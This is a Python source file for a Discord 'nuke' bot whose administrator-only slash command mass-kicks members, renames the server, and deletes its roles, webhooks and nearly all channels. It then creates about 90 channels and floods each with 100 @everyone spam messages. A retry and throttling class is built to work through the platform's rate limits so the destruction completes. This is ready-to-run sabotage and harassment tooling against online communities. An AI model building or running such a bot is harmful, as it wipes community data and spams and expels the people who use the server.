import os
import asyncio
import time
from collections import defaultdict
import discord
from discord import app_commands
from discord.ext import commands

class BucketGuard:
    def __init__(self, per_route: int = 2):
        self.per_route = per_route
        self._locks: dict[str, asyncio.Semaphore] = defaultdict(lambda: asyncio.Semaphore(per_route))
        self._global_until = 0.0
        self._glock = asyncio.Lock()

    async def _wait_global(self):
        async with self._glock:
            now = time.monotonic()
            if self._global_until > now:
                await asyncio.sleep(self._global_until - now)

    async def trip_global(self, seconds: float):
        async with self._glock:
            self._global_until = max(self._global_until, time.monotonic() + seconds)

    async def run(self, route: str, coro_factory, *, retries: int = 6):
        sem = self._locks[route]
        for attempt in range(retries):
            await self._wait_global()
            async with sem:
                try:
                    return await coro_factory()
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", None) or 1.0
                        if getattr(e, "is_global", False):
                            await self.trip_global(retry_after)
                        await asyncio.sleep(retry_after + 0.1 * attempt)
                        continue
                    if e.status in (500, 502, 503, 504):
                        await asyncio.sleep(0.5 * (attempt + 1))
                        continue
                    raise
                except (discord.Forbidden, discord.NotFound):
                    raise
        raise RuntimeError(f"route {route} exhausted retries")

GUARD = BucketGuard(per_route=3)

class NukeModal(discord.ui.Modal, title="Are you sure you want to nuke this server?"):
    confirm = discord.ui.TextInput(
        label="Type YES to confirm",
        placeholder="YES",
        required=True,
        max_length=3
    )
    kick = discord.ui.TextInput(
        label="Do you want to kick other members? (doesn't work on owners)",
        placeholder="yes or no",
        required=True,
        max_length=3
    )

    def __init__(self, bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        if self.confirm.value.upper() != "YES":
            return await interaction.response.send_message("❌ Cancelled. You did not type YES.", ephemeral=True)
        
        await interaction.response.defer()
        kick_enabled = self.kick.value.lower() == "yes"
        await self.bot.run_nuke(interaction, kick_enabled)

class NukeStartView(discord.ui.View):
    def __init__(self, bot, author):
        super().__init__(timeout=60)
        self.bot = bot
        self.author = author

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.author.id

    @discord.ui.button(label="Confirm Nuke", style=discord.ButtonStyle.danger)
    async def open_form(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(NukeModal(self.bot))

class NukeBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guilds = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # This syncs the slash command automatically so it shows up instantly
        await self.tree.sync()
        print("Slash commands synced.")

    async def on_ready(self):
        print(f"LOGGED IN AS {self.user}")

    async def run_nuke(self, interaction: discord.Interaction, kick_enabled: bool):
        guild = interaction.guild
        author_id = interaction.user.id
        bot_id = self.user.id
        owner_id = guild.owner_id

        # This sends the public "INITIATED" message in the channel
        await interaction.channel.send(
            embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange())
        )

        counts = {"kicked": 0, "channels": 0, "roles": 0, "webhooks": 0, "created": 0}
        errors: list[str] = []

        def err(label: str, e: Exception):
            errors.append(f"{label}: {type(e).__name__}: {str(e)[:60]}")

        if kick_enabled:
            targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
            sem = asyncio.Semaphore(10)
            async def do_kick(m: discord.Member):
                async with sem:
                    try:
                        await GUARD.run(f"kick:{guild.id}", lambda: m.kick(reason="nuke"))
                        counts["kicked"] += 1
                    except Exception as e:
                        err(f"kick {m}", e)
            await asyncio.gather(*(do_kick(m) for m in targets))

        try:
            await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
        except Exception as e:
            err("rename", e)

        try:
            hooks = await GUARD.run(f"webhooks:{guild.id}", lambda: guild.fetch_webhooks())
        except Exception as e:
            err("fetch webhooks", e)
            hooks = []
        hook_sem = asyncio.Semaphore(5)
        async def kill_hook(wh: discord.Webhook):
            async with hook_sem:
                try:
                    await GUARD.run(f"webhook_delete:{wh.id}", lambda: wh.delete(reason="nuke"))
                    counts["webhooks"] += 1
                except Exception as e:
                    err(f"hook {wh}", e)
        await asyncio.gather(*(kill_hook(w) for w in hooks))

        roles = [r for r in guild.roles if not r.is_default() and not r.managed]
        role_sem = asyncio.Semaphore(4)
        async def kill_role(r: discord.Role):
            async with role_sem:
                try:
                    await GUARD.run(f"role_delete:{guild.id}", lambda: r.delete(reason="nuke"))
                    counts["roles"] += 1
                except Exception as e:
                    err(f"role {r}", e)
        await asyncio.gather(*(kill_role(r) for r in roles))

        channels = list(guild.channels)
        keep = channels[-1] if channels else None
        del_sem = asyncio.Semaphore(4)
        async def kill_channel(ch: discord.abc.GuildChannel):
            if ch == keep:
                return
            async with del_sem:
                try:
                    await GUARD.run(f"channel_delete:{ch.id}", lambda: ch.delete(reason="nuke"))
                    counts["channels"] += 1
                except Exception as e:
                    err(f"channel {ch}", e)
        await asyncio.gather(*(kill_channel(c) for c in channels))

        spam_text = (
            "# say 67 ┃ <@everyone> <@here> ┃ "
            "WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"
        )

        async def create_and_spam(_i: int) -> bool:
            try:
                channel = await GUARD.run(
                    f"channel_create:{guild.id}",
                    lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"),
                )
            except Exception as e:
                err("create channel", e)
                return False

            for _ in range(100):
                try:
                    await GUARD.run(
                        f"msg:{channel.id}",
                        lambda: channel.send(
                            f"@everyone\n{spam_text}",
                            allowed_mentions=discord.AllowedMentions(everyone=True),
                        ),
                    )
                except Exception:
                    break
            return True

        results = await asyncio.gather(*(create_and_spam(i) for i in range(90)), return_exceptions=True)
        counts["created"] = sum(1 for r in results if r is True)

        target = None
        for ch in guild.channels:
            if isinstance(ch, discord.TextChannel) and ch.permissions_for(guild.me).send_messages:
                target = ch
                break
        if target is None:
            try:
                target = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="report", reason="nuke"))
            except Exception as e:
                err("final channel", e)

        embed = discord.Embed(
            title="☢️ COMPLETE",
            description=(
                f"**kicked:** {counts['kicked']}\n"
                f"**deleted:** {counts['channels']} ch · {counts['roles']} roles · {counts['webhooks']} hooks\n"
                f"**created:** {counts['created']} channels\n"
                f"**by:** {interaction.user.mention}"
            ),
            color=discord.Color.red(),
        )
        if errors:
            embed.add_field(name="⚠️", value="\n".join(errors[:5]) + (f"\n+{len(errors)-5}" if len(errors) > 5 else ""), inline=False)
        if target:
            try:
                await GUARD.run(f"msg:{target.id}", lambda: target.send(embed=embed))
            except Exception:
                pass

bot = NukeBot()

@bot.tree.command(name="nuke", description="Nuke this server")
@app_commands.checks.has_permissions(administrator=True)
async def nuke_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="☢️ Nuke this server",
        description="Click the button below to open the confirmation fourm.",
        color=discord.Color.red()
    )
    view = NukeStartView(bot, interaction.user)
    # ephemeral=True makes it only visible to the user who typed /nuke
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

if __name__ == "__main__":
    bot.run(os.environ["DISCORD_TOKEN"])
